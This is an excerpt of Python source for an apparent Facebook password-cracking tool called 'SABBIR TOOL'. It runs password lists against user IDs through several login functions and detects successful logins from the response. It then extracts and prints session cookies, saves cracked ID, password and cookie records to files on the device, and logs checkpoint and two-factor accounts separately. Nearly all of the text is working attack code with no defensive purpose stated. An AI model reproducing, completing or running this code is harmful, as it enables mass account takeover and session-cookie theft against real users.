...
while key == 'true':
    ...
    if username == CorrectUsername:
            print(f'\033[1;37m-----------------------------------------------\n\033[0;97m[•]\033[1;32m LOGGED IN SABBIR TOOL SUCCESSFULLY') 
            time.sleep(1)
            clear()
            key = 'false'
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aws:
                                ...
                                print('\r\r\033[1;32m [SABBIR-OK] %s | %s'%(ids,pas))
                                open('/sdcard/SABBIR-OK.txt','a').write(ids+'|'+pas+'\n');open('/sdcard/SATAN-OK-COOKiE.txt','a').write(ids+'|'+pas+'|'+kuki+'\n')
                              
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aws:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [SABBIR-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/SABBIR-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api1(ids,names,passlist):
	try:
		...
		sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSABBIR\x1b[1;92m-\x1b[1;92mM1\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
				uid = str(po['uid'])
				print('\r\r\033[1;32m [SABBIR-OK] '+uid+' | '+pas+'|'+asha(uid)+'\033[1;32m')                                
				ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
				ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				cookies = f"sb={ssbb};{ckkk}"
				print('\033[1;37m [🍪] Cookies :- '+cookies)
				open('/sdcard/SABBIR-OK.txt','a').write(uid+'|'+pas+'|'+cookies+'\n')
				oks.append(uid)
				break
			elif 'www.facebook.com' in po['error']['message']:
				uid = str(po['error']['error_data']['uid'])
				print(f'\r\r\033[1;33m [SABBIR-CP] '+uid+' | '+pas+'\033[1;97m')
				open('/sdcard/SABBIR-CP.txt','a').write(uid+'|'+pas+'\n')
				cps.append(uid)
				break
			else:
				continue
...
def bd1(ids,passlist):
    ...
    # 'cookie': 'datr=1DBBZbZyaGp5le1sJTzp4U6u; sb=1DBBZaRC-f2E62jKGepGerIu; m_pixel_ratio=2; wd=360x698; fr=0onEU837moN0tO3rd..BlQTDU.Xi.AAA.0.0.BlRVUV.AWXhQbacl0o',
    'dpr': '2',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [SABBIR-OK] '+ids+' | '+ps)                
                print('\033[1;37m [🍪] Cookies :- '+coki)                
                open('/sdcard/SABBIR-OK.txt', 'a').write( ids+' | '+ps+' | '+coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print(f'\r\r\033[1;33m [SABBIR-CP] '+ids+' | '+ps+'\033[1;97m')
                open('/sdcard/SABBIR-CP.txt', 'a').write( ids+' | '+ps+' \n')
                cps.append(cid)
            elif twf in session.cookies.get_dict().keys():
                print('\033[1;93m\033[0;34mSABBIR-2F '+ids+' • '+ps+'  \033[0;97m')
                break
            else:
                continue
        loop+=1
